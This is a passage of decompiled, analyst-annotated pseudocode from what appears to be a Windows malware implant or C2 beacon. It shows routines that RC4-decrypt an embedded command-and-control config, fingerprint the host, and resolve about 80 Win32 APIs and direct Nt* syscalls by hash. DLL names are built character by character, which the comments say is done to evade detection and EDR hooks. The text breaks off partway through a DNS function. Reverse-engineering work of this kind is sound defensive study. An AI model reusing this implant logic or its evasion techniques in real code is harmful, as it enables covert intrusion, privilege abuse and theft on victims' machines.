  binary_buffer_write_string(piVar8,*(undefined8 **)(*param_1 + 0x48));
  binary_buffer_write_string(piVar8,*(undefined8 **)(*param_1 + 0x30));
  lVar4 = *(longlong *)(param_1[1] + 8);
  iVar5 = binary_buffer_get_size((longlong)piVar8);
  lVar9 = binary_buffer_get_data_ptr((longlong)piVar8);
  rc4_encrypt(lVar9,iVar5,lVar4,0x10);
  uVar6 = strlen_wrapper(*(longlong *)(*param_1 + 0x38));
  heap_realloc((longlong *)(*param_1 + 0x38),uVar6);
  uVar6 = strlen_wrapper(*(longlong *)(*param_1 + 0x40));
  heap_realloc((longlong *)(*param_1 + 0x40),uVar6);
  uVar6 = strlen_wrapper(*(longlong *)(*param_1 + 0x48));
  heap_realloc((longlong *)(*param_1 + 0x48),uVar6);
  uVar6 = strlen_wrapper(*(longlong *)(*param_1 + 0x30));
  heap_realloc((longlong *)(*param_1 + 0x30),uVar6);
  uVar7 = binary_buffer_get_size((longlong)piVar8);
  uVar10 = binary_buffer_get_data_ptr((longlong)piVar8);
  if (piVar8 != (int *)0x0) {
    binary_buffer_free_data();
    binary_buffer_free((longlong)piVar8);
  }
  *param_2 = uVar7;
  return uVar10;
}



/* config_struct_alloc @ 35d4439a0 */

undefined8 config_struct_alloc(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/*
 * parse_rc4_config @ 35d4439de
 *
 * Decrypts and parses the C2 config from .rdata:
 *   1. Copies encrypted blob (get_encrypted_config_ptr, size get_encrypted_config_size)
 *   2. Reads first uint32 as encrypted data size (229 bytes)
 *   3. Extracts 16-byte RC4 key from after the encrypted data
 *   4. RC4-decrypts the config
 *   5. Sequentially reads fields via binary_reader_read_uint32/string/byte:
 *      - Timing params (sleep, jitter, interval)
 *      - Server list (length-prefixed strings + ports)
 *      - HTTP method, URI paths, custom headers
 *      - User-Agent string
 *      - Proxy settings, exit action
 */

void parse_rc4_config(undefined4 *param_1)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  undefined8 uVar4;
  undefined8 *puVar5;
  int *piVar6;
  longlong lVar7;
  longlong lVar8;
  ulonglong uVar9;
  undefined8 *local_48;
  uint local_40;
  uint local_3c;
  int *local_38;
  uint local_2c;
  uint local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  
  local_40 = 0;
  uVar4 = get_encrypted_config_size();
  local_2c = (uint)uVar4;
  local_48 = (undefined8 *)heap_alloc(local_2c);
  uVar9 = (ulonglong)local_2c;
  puVar5 = (undefined8 *)get_encrypted_config_ptr();
  memcpy_wrapper(local_48,puVar5,uVar9);
  piVar6 = (int *)binary_buffer_alloc(0x18);
  binary_buffer_init_with_data(piVar6,local_48,local_2c);
  local_38 = piVar6;
  local_3c = binary_reader_read_uint32(piVar6);
  uVar4 = heap_alloc(0x10);
  *(undefined8 *)(param_1 + 2) = uVar4;
  lVar7 = binary_buffer_get_data_ptr((longlong)local_38);
  memcpy_wrapper(*(undefined8 **)(param_1 + 2),(undefined8 *)((ulonglong)local_3c + 4 + lVar7),0x10);
  uVar2 = local_3c;
  lVar7 = *(longlong *)(param_1 + 2);
  lVar8 = binary_buffer_get_data_ptr((longlong)local_38);
  rc4_decrypt(lVar8 + 4,uVar2,lVar7,0x10);
  uVar1 = binary_reader_read_uint32(local_38);
  *param_1 = uVar1;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[6] = uVar1;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[7] = uVar1;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[4] = uVar1;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[5] = uVar1;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[1] = uVar1;
  uVar2 = binary_reader_read_byte(local_38);
  param_1[0x12] = uVar2 & 0xff;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[0xc] = uVar1;
  uVar4 = heap_alloc(param_1[0xc] << 3);
  *(undefined8 *)(param_1 + 0xe) = uVar4;
  uVar4 = heap_alloc(param_1[0xc] * 2);
  *(undefined8 *)(param_1 + 0x10) = uVar4;
  for (local_1c = 0; local_1c < (uint)param_1[0xc]; local_1c = local_1c + 1) {
    lVar7 = *(longlong *)(param_1 + 0xe);
    lVar8 = (longlong)(int)local_1c;
    puVar5 = binary_reader_read_string(local_38,&local_40);
    *(undefined8 **)(lVar7 + lVar8 * 8) = puVar5;
    uVar1 = binary_reader_read_uint32(local_38);
    *(short *)(*(longlong *)(param_1 + 0x10) + (longlong)(int)local_1c * 2) = (short)uVar1;
  }
  puVar5 = binary_reader_read_string(local_38,&local_40);
  *(undefined8 **)(param_1 + 0x14) = puVar5;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[0x16] = uVar1;
  uVar4 = heap_alloc(param_1[0x16] << 3);
  *(undefined8 *)(param_1 + 0x18) = uVar4;
  for (local_20 = 0; local_20 < (uint)param_1[0x16]; local_20 = local_20 + 1) {
    lVar7 = *(longlong *)(param_1 + 0x18);
    uVar9 = (ulonglong)local_20;
    puVar5 = binary_reader_read_string(local_38,&local_40);
    *(undefined8 **)(lVar7 + uVar9 * 8) = puVar5;
  }
  puVar5 = binary_reader_read_string(local_38,&local_40);
  *(undefined8 **)(param_1 + 0x1a) = puVar5;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[0x1c] = uVar1;
  uVar4 = heap_alloc(param_1[0x1c] << 3);
  *(undefined8 *)(param_1 + 0x1e) = uVar4;
  for (local_24 = 0; local_24 < (uint)param_1[0x1c]; local_24 = local_24 + 1) {
    lVar7 = *(longlong *)(param_1 + 0x1e);
    uVar9 = (ulonglong)local_24;
    puVar5 = binary_reader_read_string(local_38,&local_40);
    *(undefined8 **)(lVar7 + uVar9 * 8) = puVar5;
  }
  puVar5 = binary_reader_read_string(local_38,&local_40);
  *(undefined8 **)(param_1 + 0x20) = puVar5;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[0x22] = uVar1;
  iVar3 = binary_reader_read_uint32(local_38);
  param_1[0x23] = param_1[0x22] + iVar3;
  uVar1 = binary_reader_read_uint32(local_38);
  param_1[0x24] = uVar1;
  uVar4 = heap_alloc(param_1[0x24] << 3);
  *(undefined8 *)(param_1 + 0x26) = uVar4;
  for (local_28 = 0; local_28 < (uint)param_1[0x24]; local_28 = local_28 + 1) {
    lVar7 = *(longlong *)(param_1 + 0x26);
    uVar9 = (ulonglong)local_28;
    puVar5 = binary_reader_read_string(local_38,&local_40);
    *(undefined8 **)(lVar7 + uVar9 * 8) = puVar5;
  }
  uVar1 = binary_reader_read_uint32(local_38);
  *(char *)(param_1 + 0x28) = (char)uVar1;
  uVar1 = binary_reader_read_uint32(local_38);
  *(char *)((longlong)param_1 + 0xa1) = (char)uVar1;
  puVar5 = binary_reader_read_string(local_38,&local_40);
  *(undefined8 **)(param_1 + 0x2a) = puVar5;
  uVar1 = binary_reader_read_uint32(local_38);
  *(short *)(param_1 + 0x2c) = (short)uVar1;
  puVar5 = binary_reader_read_string(local_38,&local_40);
  *(undefined8 **)(param_1 + 0x2e) = puVar5;
  puVar5 = binary_reader_read_string(local_38,&local_40);
  piVar6 = local_38;
  *(undefined8 **)(param_1 + 0x30) = puVar5;
  param_1[10] = 0x19000;
  if (local_38 != (int *)0x0) {
    binary_buffer_free_data();
    binary_buffer_free((longlong)piVar6);
  }
  heap_realloc((longlong *)&local_48,local_2c);
  return;
}



/* host_fingerprint_alloc @ 35d443eb0 */

undefined8 host_fingerprint_alloc(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* host_fingerprint_init @ 35d443eee */

void host_fingerprint_init(undefined4 *param_1)

{
  char cVar1;
  byte bVar2;
  undefined2 uVar3;
  undefined4 uVar4;
  int iVar5;
  undefined8 uVar6;
  longlong lVar7;
  undefined8 *puVar8;
  longlong unaff_GS_OFFSET;
  undefined8 local_160;
  undefined2 local_158;
  undefined2 local_154;
  char local_46;
  int local_40;
  undefined8 local_3c;
  undefined4 local_34;
  longlong local_30;
  undefined4 local_24;
  longlong local_20;
  undefined4 local_14;
  
  local_3c = 0;
  local_34 = 0;
  puVar8 = &local_160;
  for (lVar7 = 0x23; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined4 *)puVar8 = 0;
  local_160._0_4_ = 0x11c;
  (**(code **)(g_syscall_table + 0x20))(1,&local_3c,0xc,0);
  (**(code **)(g_syscall_table + 0x50))(&local_160);
  local_40 = 0;
  (**(code **)(g_win32_api_table + 0x150))(0xffffffffffffffff,&local_40);
  uVar4 = prng_next();
  *param_1 = uVar4;
  uVar3 = (**(code **)(g_win32_api_table + 0x88))();
  *(undefined2 *)(param_1 + 1) = uVar3;
  uVar3 = (**(code **)(g_win32_api_table + 0xe0))();
  *(undefined2 *)((longlong)param_1 + 6) = uVar3;
  cVar1 = FUN_35d4541bf();
  *(char *)(param_1 + 2) = cVar1;
  local_24 = 0x30;
  local_30 = *(longlong *)(unaff_GS_OFFSET + 0x30);
  *(short *)((longlong)param_1 + 10) = (short)*(undefined8 *)(local_30 + 0x40);
  local_14 = 0x30;
  local_20 = *(longlong *)(unaff_GS_OFFSET + 0x30);
  *(short *)(param_1 + 3) = (short)*(undefined8 *)(local_20 + 0x48);
  uVar4 = FUN_35d454216();
  param_1[6] = uVar4;
  param_1[4] = 1;
  if ((param_1[4] == 0) && (local_40 == 0)) {
    bVar2 = 0;
  }
  else {
    bVar2 = 1;
  }
  param_1[5] = (uint)bVar2;
  *(undefined2 *)(param_1 + 9) = local_154;
  *(undefined2 *)(param_1 + 8) = local_160._4_2_;
  *(undefined2 *)((longlong)param_1 + 0x22) = local_158;
  param_1[7] = (uint)(local_46 != '\x01');
  iVar5 = FUN_35d4542df();
  param_1[10] = iVar5;
  lVar7 = FUN_35d4543ec();
  *(longlong *)(param_1 + 0x12) = lVar7;
  lVar7 = FUN_35d4544ca();
  *(longlong *)(param_1 + 0xe) = lVar7;
  lVar7 = FUN_35d454455();
  *(longlong *)(param_1 + 0x10) = lVar7;
  uVar6 = FUN_35d45453f();
  *(undefined8 *)(param_1 + 0xc) = uVar6;
  return;
}



/* memset_wrapper @ 35d444140 */

ulonglong * memset_wrapper(ulonglong *param_1,byte param_2,ulonglong param_3)

{
  ulonglong local_res18;
  ulonglong local_20;
  ulonglong local_18;
  ulonglong *local_10;
  
  local_res18 = param_3;
  local_10 = param_1;
  if (7 < param_3) {
    local_18 = (ulonglong)param_2;
    for (local_20 = 1; local_res18 = param_3, local_10 = param_1, local_20 < 8;
        local_20 = local_20 + 1) {
      local_18 = local_18 | local_18 << 8;
    }
    for (; (((ulonglong)local_10 & 7) != 0 && (local_res18 != 0)); local_res18 = local_res18 - 1) {
      *(byte *)local_10 = param_2;
      local_10 = (ulonglong *)((longlong)local_10 + 1);
    }
    for (; 7 < local_res18; local_res18 = local_res18 - 8) {
      *local_10 = local_18;
      local_10 = local_10 + 1;
    }
  }
  while (local_res18 != 0) {
    *(byte *)local_10 = param_2;
    local_res18 = local_res18 - 1;
    local_10 = (ulonglong *)((longlong)local_10 + 1);
  }
  return param_1;
}



/* memcpy_wrapper @ 35d444210 */

undefined8 * memcpy_wrapper(undefined8 *param_1,undefined8 *param_2,ulonglong param_3)

{
  ulonglong local_res18;
  undefined8 *local_18;
  undefined8 *local_10;
  
  local_res18 = param_3;
  local_18 = param_2;
  local_10 = param_1;
  if ((7 < param_3) &&
     (local_res18 = param_3, local_18 = param_2, local_10 = param_1,
     (((uint)param_2 | (uint)param_1) & 7) == 0)) {
    for (; 7 < local_res18; local_res18 = local_res18 - 8) {
      *local_10 = *local_18;
      local_10 = local_10 + 1;
      local_18 = local_18 + 1;
    }
  }
  while (local_res18 != 0) {
    *(undefined1 *)local_10 = *(undefined1 *)local_18;
    local_res18 = local_res18 - 1;
    local_18 = (undefined8 *)((longlong)local_18 + 1);
    local_10 = (undefined8 *)((longlong)local_10 + 1);
  }
  return param_1;
}



/* char_identity_antistatic @ 35d4442af */

undefined1 char_identity_antistatic(undefined1 param_1)

{
  return param_1;
}



/*
 * master_api_resolver @ 35d4442ce
 *
 * Resolves all runtime APIs at startup. Two resolution layers:
 *
 * Layer 1 — g_win32_api_table (~80 Win32 APIs from 5 DLLs):
 *   Walks PEB → Ldr → InMemoryOrderModuleList to find loaded modules.
 *   For each target DLL (built char-by-char to evade detection):
 *     - kernel32.dll → VirtualAlloc, CreateProcessA/W, CreateThread, etc.
 *     - Iphlpapi.dll → GetAdaptersInfo (host fingerprinting)
 *     - Advapi32.dll → OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser,
 *                       AdjustTokenPrivileges, CreateProcessAsUserA, RevertToSelf
 *     - msvcrt.dll   → sprintf, snprintf
 *     - Ws2_32.dll   → socket, connect, send, recv, WSAStartup (SOCKS/P2P)
 *
 * Layer 2 — g_syscall_table (Nt* direct syscalls):
 *   Resolves syscall numbers for NtAllocateVirtualMemory, NtQuerySystemInformation,
 *   NtOpenProcess, NtTerminateProcess, NtDelayExecution, NtWaitForSingleObject, etc.
 *   Used for stealthier operations that bypass EDR-hooked ntdll stubs.
 */

undefined8 master_api_resolver(void)

{
  undefined8 *puVar1;
  undefined8 uVar2;
  undefined1 local_70;
  undefined1 local_6f;
  undefined1 local_6e;
  undefined1 local_6d;
  undefined1 local_6c;
  undefined1 local_6b;
  undefined1 local_6a;
  undefined1 local_69;
  undefined1 local_68;
  undefined1 local_67;
  undefined1 local_66;
  undefined1 local_65;
  undefined1 local_64;
  undefined1 local_63;
  undefined1 local_62;
  undefined1 local_61;
  undefined1 local_60;
  undefined1 local_5f;
  undefined1 local_5e;
  undefined1 local_5d;
  undefined1 local_5c;
  undefined1 local_5b;
  undefined1 local_5a;
  undefined1 local_59;
  undefined1 local_58;
  undefined1 local_57;
  undefined1 local_56;
  undefined1 local_55;
  undefined1 local_54;
  undefined1 local_53;
  undefined1 local_52;
  undefined1 local_51;
  undefined1 local_50;
  undefined1 local_4f;
  undefined1 local_4e;
  undefined1 local_4d;
  undefined1 local_4c;
  undefined1 local_4b;
  undefined1 local_4a;
  undefined1 local_49;
  undefined1 local_48;
  undefined1 local_47;
  undefined1 local_46;
  undefined1 local_45;
  undefined1 local_44;
  undefined1 local_43;
  undefined1 local_42;
  undefined1 local_41;
  longlong local_40;
  longlong local_38;
  longlong local_30;
  longlong local_28;
  longlong local_20;
  code *local_18;
  longlong local_10;
  
  local_10 = FUN_35d450a2a(0x7b348614);
  local_18 = (code *)resolve_export_by_hash(local_10,-0x5100eb86);
  DAT_35d459000 = (longlong *)(*local_18)(0x40,0x30);
  g_win32_api_table = (undefined8 *)(*local_18)(0x40,0x308);
  g_syscall_table = (undefined8 *)(*local_18)(0x40,0x80);
  *DAT_35d459000 = local_10;
  if ((g_win32_api_table == (undefined8 *)0x0) || (local_10 == 0)) {
    uVar2 = 0;
  }
  else {
    puVar1 = resolve_export_by_hash(local_10,0x1159d0fa);
    g_win32_api_table[0x2b] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x1cba2820);
    *g_win32_api_table = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x4e15ef6e);
    g_win32_api_table[1] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x44701e19);
    g_win32_api_table[2] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x375c5b8c);
    g_win32_api_table[3] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x2c733cfa);
    g_win32_api_table[4] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x352ef9d8);
    g_win32_api_table[5] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x2ef9b665);
    g_win32_api_table[6] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0xcf2b3d0);
    g_win32_api_table[7] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x6d59f261);
    g_win32_api_table[8] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x21d8fe57);
    g_win32_api_table[9] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x75b1df38);
    g_win32_api_table[10] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x5b6e9a42);
    g_win32_api_table[0xb] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x5181e9e1);
    g_win32_api_table[0xc] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x8eb09a8);
    g_win32_api_table[0x15] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x35b3582f);
    g_win32_api_table[0x16] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x257f195b);
    g_win32_api_table[0xd] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x2ffa9aae);
    g_win32_api_table[0xe] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x2532d7bb);
    g_win32_api_table[0xf] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x26ccae3b);
    g_win32_api_table[0x10] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x57baa568);
    g_win32_api_table[0x11] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x3bc15572);
    g_win32_api_table[0x12] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x63b99503);
    g_win32_api_table[0x13] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x4d986681);
    g_win32_api_table[0x14] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x5774353f);
    g_win32_api_table[0x17] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x4259a42c);
    g_win32_api_table[0x18] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x3da055a6);
    g_win32_api_table[0x19] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x244ca11e);
    g_win32_api_table[0x1a] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0xdf43974);
    g_win32_api_table[0x1b] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x2ffb2f28);
    g_win32_api_table[0x1c] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x65b71989);
    g_win32_api_table[0x1d] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x700712f7);
    g_win32_api_table[0x1e] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x34292f22);
    g_win32_api_table[0x20] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x56b39cc5);
    g_win32_api_table[0x21] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x184f2ade);
    g_win32_api_table[0x1f] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x3227548);
    g_win32_api_table[0x22] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x53877a0b);
    g_win32_api_table[0x23] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x6f6ac4b3);
    g_win32_api_table[0x24] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x57b0866a);
    g_win32_api_table[0x25] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x1e126b94);
    g_win32_api_table[0x26] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x1652b144);
    g_win32_api_table[0x27] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x6ff8a3dc);
    g_win32_api_table[0x28] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x769a41ea);
    g_win32_api_table[0x29] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x5bf9b926);
    g_win32_api_table[0x2a] = puVar1;
    g_win32_api_table[0x2c] = local_18;
    puVar1 = resolve_export_by_hash(local_10,0x14d443b1);
    g_win32_api_table[0x2d] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x769789b1);
    g_win32_api_table[0x2e] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x2ef3d3d1);
    g_win32_api_table[0x2f] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x48ccd21c);
    g_win32_api_table[0x30] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x2308ee13);
    g_win32_api_table[0x31] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x79d7f37c);
    g_win32_api_table[0x32] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x363f9e80);
    g_win32_api_table[0x33] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x4dada1a8);
    g_win32_api_table[0x34] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x626d2e2f);
    g_win32_api_table[0x35] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x1d90f7ce);
    g_win32_api_table[0x38] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x455f5749);
    g_win32_api_table[0x39] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x2e1c9789);
    g_win32_api_table[0x36] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x761da2d0);
    g_win32_api_table[0x37] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x5b4b729d);
    g_win32_api_table[0x3a] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x63ce6376);
    g_win32_api_table[0x3b] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x42c85cd3);
    g_win32_api_table[0x3c] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x471fd0f9);
    g_win32_api_table[0x3d] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x75d45a73);
    g_win32_api_table[0x3e] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,0x12d4f52d);
    g_win32_api_table[0x3f] = puVar1;
    puVar1 = resolve_export_by_hash(local_10,-0x2b5cc311);
    g_win32_api_table[0x40] = puVar1;
    local_4d = char_identity_antistatic(0x49);
    local_4c = char_identity_antistatic(0x70);
    local_4b = char_identity_antistatic(0x68);
    local_4a = char_identity_antistatic(0x6c);
    local_49 = char_identity_antistatic(0x70);
    local_48 = char_identity_antistatic(0x61);
    local_47 = char_identity_antistatic(0x70);
    local_46 = char_identity_antistatic(0x69);
    local_45 = char_identity_antistatic(0x2e);
    local_44 = char_identity_antistatic(100);
    local_43 = char_identity_antistatic(0x6c);
    local_42 = char_identity_antistatic(0x6c);
    local_41 = char_identity_antistatic(0);
    local_20 = (*(code *)g_win32_api_table[0x2b])(&local_4d);
    DAT_35d459000[2] = local_20;
    if (local_20 != 0) {
      puVar1 = resolve_export_by_hash(local_20,-0x5ec8989c);
      g_win32_api_table[0x41] = puVar1;
    }
    local_5a = char_identity_antistatic(0x41);
    local_59 = char_identity_antistatic(100);
    local_58 = char_identity_antistatic(0x76);
    local_57 = char_identity_antistatic(0x61);
    local_56 = char_identity_antistatic(0x70);
    local_55 = char_identity_antistatic(0x69);
    local_54 = char_identity_antistatic(0x33);
    local_53 = char_identity_antistatic(0x32);
    local_52 = char_identity_antistatic(0x2e);
    local_51 = char_identity_antistatic(100);
    local_50 = char_identity_antistatic(0x6c);
    local_4f = char_identity_antistatic(0x6c);
    local_4e = char_identity_antistatic(0);
    local_28 = (*(code *)g_win32_api_table[0x2b])(&local_5a);
    DAT_35d459000[3] = local_28;
    if (local_28 != 0) {
      puVar1 = resolve_export_by_hash(local_28,0x49639a4b);
      g_win32_api_table[0x42] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,0x56f41f65);
      g_win32_api_table[0x43] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,0x4be434ac);
      g_win32_api_table[0x44] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,-0x331ae957);
      g_win32_api_table[0x45] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,0x373ff89);
      g_win32_api_table[0x47] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,0x77243019);
      g_win32_api_table[0x46] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,-0x5854c963);
      g_win32_api_table[0x48] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,0x4cb03b6b);
      g_win32_api_table[0x49] = puVar1;
      puVar1 = resolve_export_by_hash(local_28,0x231cf52b);
      g_win32_api_table[0x4a] = puVar1;
    }
    local_65 = char_identity_antistatic(0x6d);
    local_64 = char_identity_antistatic(0x73);
    local_63 = char_identity_antistatic(0x76);
    local_62 = char_identity_antistatic(99);
    local_61 = char_identity_antistatic(0x72);
    local_60 = char_identity_antistatic(0x74);
    local_5f = char_identity_antistatic(0x2e);
    local_5e = char_identity_antistatic(100);
    local_5d = char_identity_antistatic(0x6c);
    local_5c = char_identity_antistatic(0x6c);
    local_5b = char_identity_antistatic(0);
    local_30 = (*(code *)g_win32_api_table[0x2b])(&local_65);
    DAT_35d459000[4] = local_30;
    if (local_30 != 0) {
      puVar1 = resolve_export_by_hash(local_30,-0x3b1bd7f2);
      g_win32_api_table[0x4b] = puVar1;
      puVar1 = resolve_export_by_hash(local_30,0x4db600f7);
      g_win32_api_table[0x4c] = puVar1;
    }
    local_70 = char_identity_antistatic(0x57);
    local_6f = char_identity_antistatic(0x73);
    local_6e = char_identity_antistatic(0x32);
    local_6d = char_identity_antistatic(0x5f);
    local_6c = char_identity_antistatic(0x33);
    local_6b = char_identity_antistatic(0x32);
    local_6a = char_identity_antistatic(0x2e);
    local_69 = char_identity_antistatic(100);
    local_68 = char_identity_antistatic(0x6c);
    local_67 = char_identity_antistatic(0x6c);
    local_66 = char_identity_antistatic(0);
    local_38 = (*(code *)g_win32_api_table[0x2b])(&local_70);
    DAT_35d459000[5] = local_38;
    if (local_38 != 0) {
      puVar1 = resolve_export_by_hash(local_38,0x512662e2);
      g_win32_api_table[0x4d] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x6f1847d7);
      g_win32_api_table[0x4e] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x58a1e4d);
      g_win32_api_table[0x55] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x65c01702);
      g_win32_api_table[0x50] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x3b10f073);
      g_win32_api_table[0x4f] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x4e238a38);
      g_win32_api_table[0x51] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x6c0a19f2);
      g_win32_api_table[0x52] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x5f873653);
      g_win32_api_table[0x53] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x2f0868c7);
      g_win32_api_table[0x54] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0xbb3af3d);
      g_win32_api_table[0x56] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x3bc10fdc);
      g_win32_api_table[0x57] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x61b4503f);
      g_win32_api_table[0x58] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x33475c80);
      g_win32_api_table[0x59] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x6f5eb634);
      g_win32_api_table[0x5a] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x304f6d78);
      g_win32_api_table[0x5b] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x6f5f43ee);
      g_win32_api_table[0x5c] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x3bbff92f);
      g_win32_api_table[0x5d] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x65e709ec);
      g_win32_api_table[0x5e] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,-0x4bc8b38d);
      g_win32_api_table[0x5f] = puVar1;
      puVar1 = resolve_export_by_hash(local_38,0x6f560281);
      g_win32_api_table[0x60] = puVar1;
    }
    if (g_syscall_table == (undefined8 *)0x0) {
      uVar2 = 0;
    }
    else {
      local_40 = FUN_35d450a2a(0x19a59ec);
      DAT_35d459000[1] = local_40;
      if (local_40 == 0) {
        uVar2 = 0;
      }
      else {
        puVar1 = resolve_export_by_hash(local_40,-0x1267ac44);
        *g_syscall_table = puVar1;
        puVar1 = resolve_export_by_hash(local_40,0x3932454b);
        g_syscall_table[1] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,0x6130e328);
        g_syscall_table[2] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,0x68b3d2e1);
        g_syscall_table[3] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0x6e1075b9);
        g_syscall_table[4] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0xfd643c9);
        g_syscall_table[5] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0x7ba33c48);
        g_syscall_table[6] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0x908630f);
        g_syscall_table[7] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,0x43b9dd27);
        g_syscall_table[8] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0x61d72992);
        g_syscall_table[9] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0x4d7ade04);
        g_syscall_table[10] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0x59cdf4f9);
        g_syscall_table[0xb] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,0x4fa6c04e);
        g_syscall_table[0xc] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,-0x7833c566);
        g_syscall_table[0xd] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,0x5b052214);
        g_syscall_table[0xe] = puVar1;
        puVar1 = resolve_export_by_hash(local_40,0x7701adaf);
        g_syscall_table[0xf] = puVar1;
        uVar2 = 1;
      }
    }
  }
  return uVar2;
}



/* dns_resolve_host @ 35d445590 */

void dns_resolve_host(undefined4 param_1,undefined8 *param_2,uint param_3)

{
  bool bVar1;
  undefined7 extraout_var;
  
  bVar1 = socket_set_nonblocking();
